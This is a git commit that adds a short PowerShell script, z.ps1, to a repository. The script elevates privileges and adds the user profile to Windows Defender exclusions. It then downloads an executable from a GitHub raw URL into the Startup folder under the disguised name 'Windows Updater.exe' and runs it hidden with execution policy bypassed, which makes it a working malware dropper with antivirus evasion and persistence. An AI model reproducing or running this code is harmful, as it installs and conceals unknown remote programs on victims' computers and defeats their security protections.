20c7ae746aba7f2743986444fdda3c2217a3c4e5
MRvinyKing <123846936+MRvinyKing@users.noreply.github.com>
2024-03-02 00:51:01 -0300

    Add files via upload

---
+++ z.ps1
@@ -0,0 +1,7 @@
+$userDirectory = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
+$fileUrl = "https://raw.githubusercontent.com/MRvinyKing/pythonwgetfilestest/main/updater.exe"
+$startupFilePath = "$userDirectory\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.exe"
+$downloadCommand = "Invoke-WebRequest -Uri '$fileUrl' -OutFile '$startupFilePath'"
+$exclusionCommand = "Add-MpPreference -ExclusionPath '$userDirectory'"
+$startupCommand = "Start-Process '$startupFilePath'"
+Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `$($exclusionCommand); `$($downloadCommand); `$($startupCommand)"
